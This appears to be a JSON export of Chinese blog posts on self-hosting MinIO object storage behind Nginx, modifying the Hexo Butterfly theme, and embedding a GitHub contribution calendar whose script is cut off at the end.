[{"title":"使用MinIO自部署对象存储服务","url":"//blog/11574/","content":"\n## 动机\n\n[之前的文章](/blog/11170/)曾提到我将GitHub作为对象存储服务来使用，但也提到GitHub是禁止这种行为的，出于~~遵守协议~~善待GitHub的考虑，我在之后重新调研了国内外的一些对象存储、图床服务商，最终得出结论： \n\n{% note primary %}\n\n免费的服务往往会在暗中为你标上了其他形式的价格。\n\n{% endnote %}\n\n而一些大厂提供的服务，其定价文档堪比阅读理解，稍有不慎就会栽进坑里。\n\n另外，还有一些比较容易被忽略的细节：\n\n- 绝大多数的服务商都会将请求次数和流量分开计费，有的流量免费但请求收费；有的则有免费的请求额度，但流量则以GB为单位额外付费。\n- 部分服务商的HTTPS请求是按次数付费的。\n- 有的服务商，看似拥有极其慷慨的free plan，但很多限制并没有写到pricing页面里，而是在你注册进入控制台后，在很隐蔽的一个页面下才能翻到。\n- 一些服务商的定价规则包含很多具有一定歧义的“术语”，你不实际体验一下是不会理解它的真正含义的（往往都是坑），而体验的过程无疑又浪费了时间和精力。\n- 一些国外服务商已经被墙了。\n\n如果我要为了图片的稳定性去购买一些数据持久性高达12个9的服务，那倒不如把手上闲置的服务器用起来，结合快照备份回滚功能，也能保证基本的稳定性了。\n\n![image-20240517173449985](https://oss.fyz666.xyz/blogfiles/png/14ba9718e5fb20ee8cfaad596ceb9fa6.png)\n\n于是，在多种考虑之下，我决定自己部署一个对象存储服务。\n\n---\n\n这里我选择了开源分布式对象存储服务：MinIO\n\n{% link MinIO,GitHub,https://github.com/minio/minio %}\n\n其有Docker镜像，部署起来也十分方便。\n\n## Docker部署\n\n首先写一个`docker-compose.yml`文件：\n\n```yaml\nversion: '3.7'\n\nservices:\n  minio:\n    image: quay.io/minio/minio\n    container_name: minio\n    restart: unless-stopped\n    environment:\n      - MINIO_DOMAIN=oss-api.example.com\n      - MINIO_SERVER_URL=https://oss-api.example.com/\n      - MINIO_BROWSER_REDIRECT_URL=https://oss-console.example.com/\n      - MINIO_ROOT_USER=<ADMIN_USERNAME>\n      - MINIO_ROOT_PASSWORD=<ADMIN_PASSWORD>\n    ports:\n      - \"127.0.0.1:9000:9000\"\n      - \"127.0.0.1:9090:9090\"\n    volumes:\n      - ./data:/data\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:9000/minio/health/live\"]\n      interval: 30s\n      timeout: 20s\n      retries: 3\n    command: server /data --console-address \":9090\"\n```\n\n上述文件中，首先需要修改`<ADMIN_USERNAME>`与`<ADMIN_PASSWORD>`，然后修改几个域名与网址：\n\n- `MINIO_DOMAIN`：简单理解为服务提供的api的域名\n- `MINIO_SERVER_URL`：`MINIO_DOMAIN`带上`scheme`\n- `MINIO_BROWSER_REDIRECT_URL`：web控制台网址\n\n自然，需要将这两个域名都解析到服务器ip。\n\n运行`docker-compose up -d`启动服务。\n\n## Nginx反向代理\n\n因为有两个服务（api与web console），所以需要写两组配置。\n\napi反代配置：\n\n```nginx\nserver {\n    listen 80;\n    listen 443 ssl;\n    server_name oss-api.example.com;\n    ssl_certificate /path/to/fullchain;\n    ssl_certificate_key /path/to/key;\n    ignore_invalid_headers off;\n    client_max_body_size 0;\n    proxy_buffering off;\n\n    if ($scheme = http) {\n      return 301 https://$host$request_uri;\n    }\n\n    location / {\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n        proxy_set_header Host $http_host;\n\n        proxy_connect_timeout 300;\n        proxy_http_version 1.1;\n        proxy_set_header Connection \"\";\n        chunked_transfer_encoding off;\n        proxy_pass http://localhost:9000;\n    }\n}\n```\n\nweb console反代配置：\n\n```nginx\nserver {\n    listen 80;\n    listen 443 ssl;\n    server_name oss-console.example.com;\n    ssl_certificate /path/to/fullchain;\n    ssl_certificate_key /path/to/key;\n    ignore_invalid_headers off;\n    client_max_body_size 0;\n    proxy_buffering off;\n\n    if ($scheme = http) {\n        return 301 https://$host$request_uri;\n    }\n\n    location / {\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n        proxy_set_header Host $http_host;\n\n        proxy_connect_timeout 300;\n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection \"upgrade\";\n        chunked_transfer_encoding off;\n        proxy_pass http://localhost:9090;\n    }\n}\n```\n\n然后运行`nginx -s reload`\n\n## 上手使用\n\n用前面指定的管理员账号密码登录控制台，选择左侧栏\"Buckets\"，再点击右上角\"Create Bucket\"，创建一个存储桶：\n\n![image-20240517180035818](https://oss.fyz666.xyz/blogfiles/png/f644cef7f8ca3669313f1882d85b0c83.png)\n\n这里我们创建了一个名为`any-bucket-name`的桶。\n\n接下来，对这个桶进行最基本的权限配置，由于我是拿它当图床用的，自然需要开启匿名读的权限。\n\n在\"Buckets\"栏下选择刚创建的bucket，点击左侧的\"Anonymous\"，添加一条规则：\n\n![image-20240517180803747](https://oss.fyz666.xyz/blogfiles/png/98adff9a24371b85fc01eeff8e2a3ac9.png)\n\n点击左侧的\"Summary\"，修改\"Access Policy\"，选择\"Custon\"\n\n1. 将`Action`字段下的`\"s3:ListBucket\"`删除，这是为了禁止匿名查看文件列表。\n2. 可以在`Resource`值为`arn:aws:s3:::any-bucket-name/*`的配置后面增加一条`Condition`字段，用来防盗链。\n\n```json\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": [\n                    \"*\"\n                ]\n            },\n            \"Action\": [\n                \"s3:GetBucketLocation\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::any-bucket-name\"\n            ]\n        },\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": [\n                    \"*\"\n                ]\n            },\n            \"Action\": [\n                \"s3:GetObject\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::any-bucket-name/*\"\n            ],\n            \"Condition\": {\n                \"StringLike\": {\n                    \"aws:Referer\": [\n                        \"https://domain.com/*\"\n                    ]\n                }\n            }\n        }\n    ]\n}\n```\n\n然后，可选的一项：在左侧栏\"Identity->Users\"下创建一个读写权限的普通用户，用以替代管理员进行日常操作，登录普通用户后，可创建Access Key、Secret Key用于调用API：\n\n{% link Software Development Kits,MinIO Document,https://min.io/docs/minio/linux/developers/minio-drivers.html %}\n\n可以通过api来访问存储桶里面的文件：\n\n`https://oss-api.example.com/<bucket>/<path>`\n\n","tags":["Docker","对象存储","MinIO"],"categories":["瞎捣鼓经历"]},{"title":"魔改Butterfly主题的链接数据存放模式","url":"//blog/11475/","content":"\nButterfly主题在版本`4.0.0`引入了友情链接的`json`远程拉取：\n\n{% link 友情链接添加,Butterfly,https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E6%B7%BB%E5%8A%A0 %}\n\n大意是在front-matter中设置`flink_url`（指向一个`json`文件链接）来导入`json`格式的数据。\n\n该主题还有另一种友情链接文件存放模式，是将`link.yml`放在网站的`source/_data`目录下，然后在页面的front-matter中设置`type: \"link\"`来自动读取此文件。\n\n然而这两种不同模式的存在让我觉得很不自然，尤其是前面提到的第二种模式下把文件路径`source/_data/link.yml`写死而不支持自定义的行为。我觉得更加自然的方式应该是将所有链接数据文件都以相同的格式（比如都是`yaml`）存放在`source/_data`目录下，然后通过一个字段来指定`link`页面读取的是哪个文件。虽然远程拉取的模式支持从外部网站导入`json`，但通常情况下不会有这种需求（至少我没有）。\n\n于是开始魔改主题文件，在改之前，我总结了一下我的需求：\n\n- 所有链接数据文件以`yaml`格式存放在`source/_data`目录。\n- 在`type: \"link\"`的页面下定义front-matter字段`flink_file`，通过该字段指示需要读取的文件（省略`yaml`文件扩展名）。\n- `flink_file`字段不存在时，默认读取`source/_data/link.yml`。\n\n修改主题文件`themes/butterfly/layout/includes/page/flink.pug`如下：\n\n```diff\n--- a/themes/butterfly/layout/includes/page/flink.pug\n+++ b/themes/butterfly/layout/includes/page/flink.pug\n@@ -1,10 +1,10 @@\n #article-container\n   .flink\n-    - let { content, random, flink_url } = page\n+    - let { content, random, flink_file } = page\n     - let pageContent = content\n+    - const linkData = flink_file ? site.data[flink_file] : site.data.link || false\n \n-    if flink_url || random\n-      - const linkData = flink_url ? false : site.data.link || false\n+    if random\n       script.\n         (()=>{\n           const replaceSymbol = (str) => {\n@@ -44,39 +44,32 @@\n           }\n \n           const linkData = !{JSON.stringify(linkData)}\n-          if (!{Boolean(flink_url)}) {\n-            fetch(\"!{url_for(flink_url)}\")\n-              .then(response => response.json())\n-              .then(add)\n-          } else if (linkData) {\n-            add(linkData)\n-          }\n+          add(linkData)\n         })()\n \n     else\n-      if site.data.link\n-        - let result = \"\"\n-        each i in site.data.link\n-          - let className = i.class_name ? markdown(`## ${i.class_name}`) : \"\"\n-          - let classDesc = i.class_desc ? `<div class=\"flink-desc\">${i.class_desc}</div>` : \"\"\n+      - let result = \"\"\n+      each i in linkData\n+        - let className = i.class_name ? markdown(`## ${i.class_name}`) : \"\"\n+        - let classDesc = i.class_desc ? `<div class=\"flink-desc\">${i.class_desc}</div>` : \"\"\n \n-          - let listResult = \"\"\n+        - let listResult = \"\"\n \n-          each j in i.link_list\n-            - \n-              listResult += `\n-                <div class=\"flink-list-item\">\n-                  <a href=\"${j.link}\" title=\"${j.name}\">\n-                    <div class=\"flink-item-icon\">\n-                      <img class=\"no-lightbox\" src=\"${j.avatar}\" onerror='this.onerror=null;this.src=\"${url_for(theme.error_img.flink)}\"' alt=\"${j.name}\" />\n-                    </div>\n-                    <div class=\"flink-item-name\">${j.name}</div> \n-                    <div class=\"flink-item-desc\" title=\"${j.descr}\">${j.descr}</div>\n-                  </a>\n-                </div>`\n-            -\n+        each j in i.link_list\n+          - \n+            listResult += `\n+              <div class=\"flink-list-item\">\n+                <a href=\"${j.link}\" title=\"${j.name}\">\n+                  <div class=\"flink-item-icon\">\n+                    <img class=\"no-lightbox\" src=\"${j.avatar}\" onerror='this.onerror=null;this.src=\"${url_for(theme.error_img.flink)}\"' alt=\"${j.name}\" />\n+                  </div>\n+                  <div class=\"flink-item-name\">${j.name}</div> \n+                  <div class=\"flink-item-desc\" title=\"${j.descr}\">${j.descr}</div>\n+                </a>\n+              </div>`\n+          -\n \n-          - result += `${className}${classDesc} <div class=\"flink-list\">${listResult}</div>`\n+        - result += `${className}${classDesc} <div class=\"flink-list\">${listResult}</div>`\n \n-        - pageContent = result + pageContent\n+      - pageContent = result + pageContent\n     != pageContent\n```\n\n大功告成！\n","tags":["Hexo","Butterfly主题"],"categories":["博客相关","Hexo魔改"]},{"title":"Butterfly主题tabs外挂标签下代码块高度限制失效的解决方案","url":"//blog/11402/","content":"\nHexo的Butterfly主题带有一些特有的、非Markdown语法的外挂标签，作为一种写作语法扩展非常好用。然而在使用`tabs`标签时，遇到了内部代码块高度限制失效的问题。\n\n---\n\n我在Butterfly的主题文件中设置了代码块的高度限制：\n\n```yaml\nhighlight_height_limit: 300 # unit: px\n```\n\n一般情况下，当代码块高度超过300px时便会隐藏超出范围的代码，并添加一个展开按钮，但这个特性在tabs标签下的非默认tab中失效。\n\n审计了渲染代码后，我找到了处理这部分逻辑的代码，其位于主题目录下的`source/js/main.js`文件中的`createEle`函数：\n\n```js\nconst createEle = (lang, item, service) => {\n      const fragment = document.createDocumentFragment()\n\n      if (isShowTool) {\n        const hlTools = document.createElement('div')\n        hlTools.className = `highlight-tools ${highlightShrinkClass}`\n        hlTools.innerHTML = highlightShrinkEle + lang + highlightCopyEle\n        btf.addEventListenerPjax(hlTools, 'click', highlightToolsFn)\n        fragment.appendChild(hlTools)\n      }\n\n      if (highlightHeightLimit && item.offsetHeight > highlightHeightLimit + 30) {\n        const ele = document.createElement('div')\n        ele.className = 'code-expand-btn'\n        ele.innerHTML = '<i class=\"fas fa-angle-double-down\"></i>'\n        btf.addEventListenerPjax(ele, 'click', expandCode)\n        fragment.appendChild(ele)\n      }\n\n      if (service === 'hl') {\n        item.insertBefore(fragment, item.firstChild)\n      } else {\n        item.parentNode.insertBefore(fragment, item)\n      }\n    }\n```\n\n由于`display:none`的元素其`offsetHeight`会变成0，导致无法进入函数中间的那个if语句，也就无法按我们的需求进行渲染。\n\n而对于这个问题，早就有了现成的解决方案。\n\n{% tabs tab1 %}\n\n<!-- tab 使用 jQuery Actual 插件 -->\n\n我们可以引入[jQuery Actual插件](https://github.com/dreamerslab/jquery.actual)，通过它来获取隐藏元素的实际高度：\n\n在butterfly的主题文件中`inject.head`项下引入jquery.actual文件：\n\n```yaml\n- <script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery.actual/1.0.19/jquery.actual.min.js\"></script>\n```\n\n{% note info %}\n\n该文件还依赖于：jQuery >= 1.2.3\n\n{% endnote %}\n\n然后修改`themes/butterfly/source/js/main.js`中的`createEle`函数：\n\n```diff\n--- a/themes/butterfly/source/js/main.js\n+++ b/themes/butterfly/source/js/main.js\n@@ -134,8 +134,9 @@ document.addEventListener('DOMContentLoaded', function () {\n         btf.addEventListenerPjax(hlTools, 'click', highlightToolsFn)\n         fragment.appendChild(hlTools)\n       }\n \n-      if (highlightHeightLimit && item.offsetHeight > highlightHeightLimit + 30) {\n+      if (highlightHeightLimit && $(item).actual('height') > highlightHeightLimit + 30) {\n         const ele = document.createElement('div')\n         ele.className = 'code-expand-btn'\n         ele.innerHTML = '<i class=\"fas fa-angle-double-down\"></i>'\n```\n\n<!-- endtab -->\n\n<!-- tab 使用原生JS解决 -->\n\n毕竟为了一处小问题引入一个新的东西有点臃肿，不愿意引入jQuery的话还可以用原生JS解决。阅读了jQuery Actual的代码后我发现它是通过将隐藏起来的块暂时修改为：`visibility: hidden; display: block;`来获取它的高度，这是因为`visibility: hidden;`状态虽然也是隐藏，但仍会占据页面空间。在取得其高度后再恢复原有的样式。于是我们可以手写这个逻辑，来修改`themes/butterfly/source/js/main.js`：\n\n```diff\n--- a/themes/butterfly/source/js/main.js\n+++ b/themes/butterfly/source/js/main.js\n@@ -124,6 +124,39 @@\n       this.classList.toggle('expand-done')\n     }\n \n+    const getActualHeight = function (item) {\n+      let tmp = []\n+      let hidden = []\n+      function fix() {\n+      \n+          let current = item\n+          while (current !== document.body && current != null) {\n+              if (window.getComputedStyle(current).display === 'none') {\n+                  hidden.push(current)\n+              }\n+              current = current.parentNode\n+          }\n+          let style = 'visibility: hidden !important; display: block !important; '\n+  \n+          hidden.forEach(function (elem) {\n+              var thisStyle = elem.getAttribute('style') || ''\n+              tmp.push(thisStyle)\n+              elem.setAttribute('style', thisStyle ? thisStyle + ';' + style : style)\n+          })\n+      }\n+      function restore() {\n+          hidden.forEach((elem, idx) => {\n+              let _tmp = tmp[idx]\n+              if( _tmp === '' ) elem.removeAttribute('style')\n+              else elem.setAttribute('style', _tmp)\n+          })\n+      }\n+      fix()\n+      let height = item.offsetHeight\n+      restore()\n+      return height\n+    }\n+\n     const createEle = (lang, item, service) => {\n       const fragment = document.createDocumentFragment()\n \n@@ -135,7 +168,7 @@\n         fragment.appendChild(hlTools)\n       }\n \n-      if (highlightHeightLimit && item.offsetHeight > highlightHeightLimit + 30) {\n+      if (highlightHeightLimit && getActualHeight(item) > highlightHeightLimit + 30) {\n         const ele = document.createElement('div')\n         ele.className = 'code-expand-btn'\n         ele.innerHTML = '<i class=\"fas fa-angle-double-down\"></i>'\n```\n\n<!-- endtab -->\n\n{% endtabs %}\n\n---\n\n在作者的提示下才发现文档里已经有写：\n\n{% link 代码高度限制,Butterfly,https://butterfly.js.org/posts/4aa8abbe/#%E4%BB%A3%E7%A2%BC%E9%AB%98%E5%BA%A6%E9%99%90%E5%88%B6 %}\n\n- 不适用于隐藏后的代码块（ css 设置 display: none）\n\n看来这是主题的预期行为。不过我个人认为让隐藏的代码块同样折叠起来更为合理。\n","tags":["JavaScript","Web前端","Hexo","Butterfly主题"],"categories":["Debug","博客相关","Hexo魔改"]},{"title":"在Hexo博客中添加GitHub Calendar","url":"//blog/11354/","content":"\n逛别人的博客时，发现有许多博主的主页上会嵌入一个Github Calendar，如下图所示：\n\n![image-20240510025333998](https://oss.fyz666.xyz/blogfiles/png/d8b94eb0e2eb259763b638226a9e719d.png)\n\n~~放置在homepage可以让主页显得丰富一些。~~\n\n简单一搜，找到了这个项目的出处：\n\n{% link github-calendar,GitHub,https://github.com/Bloggify/github-calendar %}\n\n另外，还找到一位大佬将该项目集成的Hexo插件：\n\n{% link hexo-github-calendar,GitHub,https://github.com/Zfour/hexo-github-calendar %}\n\n基于这些信息，本文给出两种安装方法。\n\n## 修改主题\n\n{% tabs tab1 %}\n\n<!-- tab 直接安装插件 -->\n\n不愿意魔改主题的朋友可以直接安装前面提到的插件：[hexo-github-calendar](https://github.com/Zfour/hexo-github-calendar)，\n\n并在网站配置文件中添加：\n\n```yaml\ngithubcalendar:\n  enable: true\n  priority: 3\n  enable_page: /\n  user: <username>\n  layout:\n    type: id\n    name: recent-posts\n    index: 0\n  githubcalendar_html: '<div class=\"recent-post-item\" style=\"width:100%;height:auto;padding:10px;\"><div id=\"github_loading\" style=\"width:10%;height:100%;margin:0 auto;display: block\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"  viewBox=\"0 0 50 50\" style=\"enable-background:new 0 0 50 50\" xml:space=\"preserve\"><path fill=\"#d0d0d0\" d=\"M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z\" transform=\"rotate(275.098 25 25)\"><animateTransform attributeType=\"xml\" attributeName=\"transform\" type=\"rotate\" from=\"0 25 25\" to=\"360 25 25\" dur=\"0.6s\" repeatCount=\"indefinite\"></animateTransform></path></svg></div><div id=\"github_container\"></div></div>'\n  pc_minheight: 280px\n  mobile_minheight: 0px\n  color: \"['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f']\"\n  api: https://python-github-calendar-api.vercel.app/api\n  calendar_js: https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js\n  plus_style: \"\"\n```\n\n这里主要修改的内容是`user`控制显示的GitHub账号，`enable_page`控制生效的页面以及`layout`控制组件的位置，不再细说。\n\n然而这个`api`应该是挂掉的，且看后文如何通过vercel自己搭建`api`。\n\n<!-- endtab -->\n\n<!-- tab 自己动手魔改主题 -->\n\n安装插件的方式不够灵活，所以我选择自己魔改主题。首先，我希望该组件显示在主页顶部，并且在主页的每一页都有显示，因此，找到主题的`layout/includes/layout.pug`这个文件，在需要插入组件的位置写上`#github_container`，例如我：\n\n```pug\n...\n- var isHome = is_home() ? 'home' : ''\n...\nif isHome\n  #top.top(style=\"width:1500px\")\n    ...\n    .cards\n      .gc#gc\n        .recent-post-item.github_container(style='width:100%;height:auto;padding:10px;')\n          #github_container\nmain#content-inner.layout(class=hideAside) # 原来的内容\n```\n\n通过`is_home`函数判断是否为主页，并且在主页原来该有的内容前面增加一些块，其中包含`#github_container`。\n\n然后新建`source/js/githubcalendar.js`：\n\n```js\nvar github_canlendar = (git_user, git_color) => {\n    var git_githubapiurl = \"https://<your-api>?user=\" + git_user;\n    var git_fixed = 'fixed';\n    var git_px = 'px';\n    var git_month = ['一月', '二月', '三月', '四月', '五月', '六月', '七月', '八月', '九月', '十月', '十一月', '十二月'];\n    var git_monthchange = [];\n    var git_oneyearbeforeday = '';\n    var git_thisday = '';\n    var git_amonthago = '';\n    var git_aweekago = '';\n    var git_weekdatacore = 0;\n    var git_datacore = 0;\n    var git_total = 0;\n    var git_datadate = '';\n    var git_git_data = [];\n    var git_positionplusdata = [];\n    var git_firstweek = [];\n    var git_lastweek = [];\n    var git_beforeweek = [];\n    var git_thisweekdatacore = 0;\n    var git_mounthbeforeday = 0;\n    var git_mounthfirstindex = 0;\n    var git_crispedges = 'crispedges';\n    var git_thisdayindex = 0;\n    var git_amonthagoindex = 0;\n    var git_amonthagoweek = [];\n    var git_firstdate = [];\n    var git_first2date = [];\n    var git_montharrbefore = [];\n    var git_monthindex = 0;\n    var retinaCanvas = (canvas, context, ratio) => {\n        if (ratio > 1) {\n            var canvasWidth = canvas.width;\n            var canvasHeight = canvas.height;\n            canvas.width = canvasWidth * ratio;\n            canvas.height = canvasHeight * ratio;\n            canvas.style.width = '100%';\n            canvas.style.height = canvasHeight + 'px';\n            context.scale(ratio, ratio);\n        }\n    };\n    function responsiveChart() {\n        var ratio = window.devicePixelRatio || 1\n        var git_tooltip_container = document.getElementById('git_tooltip_container');\n        var git_x = '';\n        var git_y = '';\n        var git_span1 = '';\n        var git_span2 = '';\n        var c = document.getElementById(\"gitcanvas\");\n        c.style.width ='100%';\n        c.style.height ='';\n        var cmessage = document.getElementById(\"gitmessage\");\n        var ctx = c.getContext(\"2d\");\n        width = c.width = document.getElementById(\"gitcalendarcanvasbox\").offsetWidth;\n        height = c.height = 9 * 0.96 * c.width / git_data.length;\n        retinaCanvas(c,ctx, ratio)\n        var linemaxwitdh = height/ 9;\n        var lineminwitdh = 0.8 * linemaxwitdh;\n        var setposition = {x: 0.02 * width, y: 0.025 * width};\n        for (var week in git_data) {\n            weekdata = git_data[week];\n            for (var day in weekdata) {\n                var dataitem = {date: \"\", count: \"\", x: 0, y: 0};\n                git_positionplusdata.push(dataitem);\n                ctx.fillStyle = git_thiscolor(git_color, weekdata[day].count);\n                setposition.y = Math.round(setposition.y * 100) / 100;\n                dataitem.date = weekdata[day].date;\n                dataitem.count = weekdata[day].count;\n                dataitem.x = setposition.x;\n                dataitem.y = setposition.y;\n                ctx.fillRect(setposition.x, setposition.y, lineminwitdh, lineminwitdh);\n                setposition.y = setposition.y + linemaxwitdh\n            }\n            setposition.y = 0.025 * width;\n            setposition.x = setposition.x + linemaxwitdh\n        }\n        if (document.body.clientWidth > 700) {\n            ctx.font = \"600  Arial\";\n            ctx.fillStyle = '#aaa';\n            ctx.fillText(\"日\", 0, 1.9 * linemaxwitdh);\n            ctx.fillText(\"二\", 0, 3.9 * linemaxwitdh);\n            ctx.fillText(\"四\", 0, 5.9 * linemaxwitdh);\n            ctx.fillText(\"六\", 0, 7.9 * linemaxwitdh);\n            var monthindexlist = width / 24;\n            for (var index in git_monthchange) {\n                ctx.fillText(git_monthchange[index], monthindexlist, 0.7 * linemaxwitdh);\n                monthindexlist = monthindexlist + width / 12\n            }\n        }\n        c.onmousemove = function (event) {\n            if (document.querySelector('.gitmessage')) {\n                git_tooltip_container.innerHTML = \"\"\n            }\n            getMousePos(c, event)\n        };\n        git_tooltip_container.onmousemove = function (event) {\n            if (document.querySelector('.gitmessage')) {\n                git_tooltip_container.innerHTML = \"\"\n            }\n        };\n\n        function getMousePos(canvas, event) {\n            var rect = canvas.getBoundingClientRect();\n            var x = event.clientX - rect.left * (canvas.width / rect.width);\n            var y = event.clientY - rect.top * (canvas.height / rect.height);\n            for (var item of git_positionplusdata) {\n                var lenthx = x - item.x;\n                var lenthy = y - item.y;\n                if (0 < lenthx && lenthx < lineminwitdh) {\n                    if (0 < lenthy && lenthy < lineminwitdh) {\n                        git_span1 = item.date;\n                        git_span2 = item.count;\n                        git_x = event.clientX - 100;\n                        git_y = event.clientY - 60;\n                        html = tooltip_html(git_x, git_y, git_span1, git_span2);\n                        append_div_gitcalendar(git_tooltip_container, html)\n                    }\n                }\n            }\n        }\n    }\n\n    function addlastmonth() {\n        if (git_thisdayindex === 0) {\n            thisweekcore(52);\n            thisweekcore(51);\n            thisweekcore(50);\n            thisweekcore(49);\n            thisweekcore(48);\n            git_thisweekdatacore += git_firstdate[6].count;\n            git_amonthago = git_firstdate[6].date\n        } else {\n            thisweekcore(52);\n            thisweekcore(51);\n            thisweekcore(50);\n            thisweekcore(49);\n            thisweek2core();\n            git_amonthago = git_first2date[git_thisdayindex - 1].date\n        }\n    }\n\n    function thisweek2core() {\n        for (var i = git_thisdayindex - 1; i < git_first2date.length; i++) {\n            git_thisweekdatacore += git_first2date[i].count\n        }\n    }\n\n    function thisweekcore(index) {\n        for (var item of git_data[index]) {\n            git_thisweekdatacore += item.count\n        }\n    }\n\n    function addlastweek() {\n        for (var item of git_lastweek) {\n            git_weekdatacore += item.count\n        }\n    }\n\n    function addbeforeweek() {\n        for (var i = git_thisdayindex; i < git_beforeweek.length; i++) {\n            git_weekdatacore += git_beforeweek[i].count\n        }\n    }\n\n    function addweek(data) {\n        if (git_thisdayindex === 6) {\n            git_aweekago = git_lastweek[0].date;\n            addlastweek()\n        } else {\n            lastweek = data.contributions[51];\n            git_aweekago = lastweek[git_thisdayindex + 1].date;\n            addlastweek();\n            addbeforeweek()\n        }\n    }\n\n    fetch(git_githubapiurl).then(data => data.json()).then(data => {\n        git_data = data.contributions;\n        git_total = data.total;\n        git_first2date = git_data[48];\n        git_firstdate = git_data[47];\n        git_firstweek = data.contributions[0];\n        git_lastweek = data.contributions[52];\n        git_beforeweek = data.contributions[51];\n        git_thisdayindex = git_lastweek.length - 1;\n        git_thisday = git_lastweek[git_thisdayindex].date;\n        git_oneyearbeforeday = git_firstweek[0].date;\n        git_monthindex = git_thisday.substring(5, 7) * 1;\n        git_montharrbefore = git_month.splice(git_monthindex, 12 - git_monthindex);\n        git_monthchange = git_montharrbefore.concat(git_month);\n        addweek(data);\n        addlastmonth();\n        var html = github_main_box(git_monthchange, git_data, git_user, git_color, git_total, git_thisweekdatacore, git_weekdatacore, git_oneyearbeforeday, git_thisday, git_aweekago, git_amonthago);\n        append_div_gitcalendar(github_container, html);\n        if(document.getElementById('github_loading')){\n            document.getElementById('github_loading').remove()};\n        responsiveChart()\n    }).catch(function (error) {\n        console.log(error)\n    });\n    window.onresize = function () {\n        responsiveChart()\n    };\n    window.onscroll = function () {\n        if (document.querySelector('.gitmessage')) {\n            git_tooltip_container.innerHTML = \"\"\n        }\n    };\n    var git_thiscolor = (color, x) => {\n        if (x === 0) {\n            var i = parseInt(x / 2);\n            return color[0]\n        } else if (x < 2) {\n            return color[1]\n        } else if (x < 20) {\n            var i = parseInt(x / 2);\n            return color[i]\n        } else {\n            return color[9]\n        }\n    };\n    var tooltip_html = (x, y, span1, span2) => {\n        var html = '';\n        html += '<div class=\"gitmessage\" style=\"top:' + y + 'px;left:' + x + 'px;position: fixed;z-index:9999\"><div class=\"angle-wrapper\" style=\"display:block;\"><span>' + span1 + '&nbsp;</span><span>' + span2 + ' 次上传</span></div></div>';\n        return html\n    };\n    var github_canvas_box = () => {\n        var html = '<div id=\"gitcalendarcanvasbox\"> <canvas id=\"gitcanvas\" style=\"animation: none;\"></canvas></div>';\n        return html\n    };\n    var github_info_box = (user, color) => {\n        var html = '';\n        html += '<div id=\"git_tooltip_container\"></div><div class=\"contrib-footer clearfix mt-1 mx-3 px-3 pb-1\"><div class=\"float-left text-gray\">数据来源 <a href=\"https://github.com/' + user + '\" target=\"blank\">@' + user + '</a></div><div class=\"contrib-legend text-gray\">Less <ul class=\"legend\"><li style=\"background-color:' + color[0] + '\"></li><li style=\"background-color:' + color[2] + '\"></li><li style=\"background-color:' + color[4] + '\"></li><li style=\"background-color:' + color[6] + '\"></li><li style=\"background-color:' + color[8] + '\"></li></ul>More </div></div>';\n        return html\n    };\n    var github_main_box = (monthchange, git_data, user, color, total, thisweekdatacore, weekdatacore, oneyearbeforeday, thisday, aweekago, amonthago) => {\n        var html = '';\n        var canvasbox = github_canvas_box();\n        var infobox = github_info_box(user, color);\n        var style = github_main_style();\n        html += '<div class=\"position-relative\"><div class=\"border py-2 graph-before-activity-overview\"><div class=\"js-gitcalendar-graph mx-md-2 mx-3 d-flex flex-column flex-items-end flex-xl-items-center overflow-hidden pt-1 is-graph-loading graph-canvas gitcalendar-graph height-full text-center\">' + canvasbox + '</div>' + infobox + '</div></div>';\n        html += '<div style=\"display:flex;width:100%\"><div class=\"contrib-column contrib-column-first table-column\"><span class=\"text-muted\">过去一年提交</span><span class=\"contrib-number\">' + total + '</span><span class=\"text-muted\">' + oneyearbeforeday + '&nbsp;-&nbsp;' + thisday + '</span></div><div class=\"contrib-column table-column\"><span class=\"text-muted\">最近一月提交</span><span class=\"contrib-number\">' + thisweekdatacore + '</span><span class=\"text-muted\">' + amonthago + '&nbsp;-&nbsp;' + thisday + '</span></div><div class=\"contrib-column table-column\"><span class=\"text-muted\">最近一周提交</span><span class=\"contrib-number\">' + weekdatacore + '</span><span class=\"text-muted\">' + aweekago + '&nbsp;-&nbsp;' + thisday + '</span></div></div>' + style;\n        return html\n    };\n    var github_main_style = () => {\n        style = '<style>#github_container{text-align:center;margin:0 auto;width:100%;display:flex;display:-webkit-flex;justify-content:center;align-items:center;flex-wrap:wrap;}.gitcalendar-graph text.wday,.gitcalendar-graph text.month{font-size:10px;fill:#aaa;}.contrib-legend{text-align:right;padding:0 14px 10px 0;display:inline-block;float:right;}.contrib-legend .legend{display:inline-block;list-style:none;margin:0 5px;position:relative;bottom:-1px;padding:0;}.contrib-legend .legend li{display:inline-block;width:10px;height:10px;}.text-small{font-size:12px;color:#767676;}.gitcalendar-graph{padding:15px 0 0;text-align:center;}.contrib-column{text-align:center;border-left:1px solid #ddd;border-top:1px solid #ddd;font-size:11px;}.contrib-column-first{border-left:0;}.table-column{padding:10px;display:table-cell;flex:1;vertical-align:top;}.contrib-number{font-weight:300;line-height:1.3em;font-size:24px;display:block;}.gitcalendar img.spinner{width:70px;margin-top:50px;min-height:70px;}.monospace{text-align:center;color:#000;font-family:monospace;}.monospace 